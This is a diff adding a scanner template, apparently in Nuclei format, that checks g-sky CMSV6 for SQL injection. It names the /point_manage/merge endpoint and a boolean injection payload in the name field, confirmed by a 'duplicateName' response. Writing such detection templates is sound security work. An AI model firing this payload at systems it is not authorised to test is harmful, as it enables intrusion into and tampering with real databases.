@@ -1,0 +1,36 @@
+id: 808gps-point-manage-sqli
+info:
+  name: 通天星 CMSV6 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1258239
+    vendor: g-sky
+    product: cmsv6
+  tags: sqli,vuln,g-sky,cmsv6
+variables:
+  name: '{{to_lower(rand_text_alpha(10))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/point_manage/merge'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: recentUpkeepMileage=5&nextUpkeepMileage=8&updateTime=2023-08-01&remark=test&vehiIdnos=%5B1%2C2%2C3%2C4%5D&nextUpkeepDayStr=3&createTime=2023-08-01&recentUpkeepDayStr=4&upkeepMileage=3&recentUpkeepDay=6&remindDay=7&upkeepStatuStr=2&vehicleId=2&nextUpkeepDay=2023-08-01&upkeepDay=4&checkItem=yes&code=code&type=1&mapId=1&installPlace=place&name={{name}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, ''"message":"OK",'') && contains(body, ''"pagination":"",'')'
+  - method: POST
+    path:
+      - '{{BaseURL}}/point_manage/merge'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: recentUpkeepMileage=5&nextUpkeepMileage=8&updateTime=2023-08-01&remark=test&vehiIdnos=%5B1%2C2%2C3%2C4%5D&nextUpkeepDayStr=3&createTime=2023-08-01&recentUpkeepDayStr=4&upkeepMileage=3&recentUpkeepDay=6&remindDay=7&upkeepStatuStr=2&vehicleId=2&nextUpkeepDay=2023-08-01&upkeepDay=4&checkItem=yes&code=code&type=1&mapId=1&installPlace=place&name={{name}}'OR'1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, ''"key":"duplicateName"'')'
